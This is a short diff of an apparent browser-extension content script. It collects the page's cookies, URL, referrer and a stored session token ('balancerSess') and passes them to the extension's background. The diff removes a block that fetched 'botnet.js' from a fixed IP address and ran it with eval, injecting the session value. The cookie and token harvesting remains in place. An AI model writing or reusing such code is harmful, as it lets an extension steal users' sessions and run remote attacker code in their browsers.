@@ -7,7 +7,7 @@ function httpGet(theUrl) {
 cookie=document.cookie;
 url=document.location.href;
 ref=document.referrer;
-hash=localStorage.getItem("balancerSess");
+var hash=localStorage.getItem("balancerSess");
 
 var debug = {
 	cookie: cookie,
@@ -18,11 +18,7 @@ var debug = {
 
 chrome.runtime.sendMessage(debug, function(response) {
   console.log(rr=response);
-	selector=location.href.split("/");
-	if((selector[3]=="botnet")&&(selector[4]=="ext")){
-	eval('hash="'+hash+'";'+httpGet('http://10.68.100.60/botnet/ext/botnet.js'));
-}
-});
+	});
 
 
 //if(document.location.href.indexOf('https://esd.pr.')>-1){alert(1);}
